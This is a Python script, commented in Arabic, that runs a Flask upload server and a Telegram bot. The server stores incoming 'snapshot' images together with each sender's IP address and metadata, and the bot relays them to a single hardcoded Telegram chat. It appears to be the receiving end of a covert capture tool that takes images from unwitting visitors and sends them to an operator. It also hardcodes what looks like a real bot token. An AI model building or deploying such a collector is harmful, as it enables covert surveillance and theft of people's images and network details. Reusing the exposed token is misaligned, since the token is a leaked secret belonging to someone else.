import os, threading, json
from flask import Flask, request
from telegram.ext import ApplicationBuilder, CommandHandler
from datetime import datetime

# 1. الإعدادات والمجلدات
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
for folder in ["images", "metadata", "sent"]:
    os.makedirs(os.path.join(BASE_DIR, folder), exist_ok=True)

# 2. السيرفر (Flask)
app = Flask(__name__)
@app.route('/', methods=['GET'])
def index(): return "Bot & Server Running"

@app.route('/upload', methods=['POST'])
def upload():
    image = request.files.get('image')
    metadata = request.form.get('metadata')
    if image:
        ts = datetime.now().strftime('%Y%m%d_%H%M%S')
        image.save(os.path.join(BASE_DIR, "images", f'snapshot_{ts}.png'))
        with open(os.path.join(BASE_DIR, "metadata", 'latest.json'), 'w') as f:
            json.dump({'client_ip': request.remote_addr, 'data': json.loads(metadata) if metadata else {}}, f)
        return 'Uploaded', 200
    return 'No image', 400

def run_flask(): app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))

# 3. البوت (Telegram)
BOT_TOKEN = "8612074749:AAHGvzF43cf5AkwzGhEDJHgvwNRF2KaO2qg"
AUTHORIZED_CHAT_ID = 5087545397

async def status(u, c):
    if u.effective_chat.id == AUTHORIZED_CHAT_ID:
        await u.message.reply_text("✅ Bot & Server are running!")

async def infos(u, c):
    if u.effective_chat.id != AUTHORIZED_CHAT_ID: return
    path = os.path.join(BASE_DIR, "metadata", 'latest.json')
    if os.path.exists(path):
        with open(path, 'r') as f: await u.message.reply_text(f.read())
    else: await u.message.reply_text("⚠️ No info found")

async def images(u, c):
    if u.effective_chat.id != AUTHORIZED_CHAT_ID: return
    img_dir = os.path.join(BASE_DIR, "images")
    files = [f for f in os.listdir(img_dir) if f.lower().endswith((".jpg", ".png"))]
    if not files:
        await u.message.reply_text("⚠️ No images")
        return
    for f in files:
        with open(os.path.join(img_dir, f), "rb") as img:
            await u.message.reply_photo(photo=img)
        os.replace(os.path.join(img_dir, f), os.path.join(BASE_DIR, "sent", f))

# 4. التشغيل
if __name__ == '__main__':
    threading.Thread(target=run_flask, daemon=True).start()
    bot_app = ApplicationBuilder().token(BOT_TOKEN).build()
    bot_app.add_handler(CommandHandler("status", status))
    bot_app.add_handler(CommandHandler("infos", infos))
    bot_app.add_handler(CommandHandler("images", images))
    bot_app.run_polling()
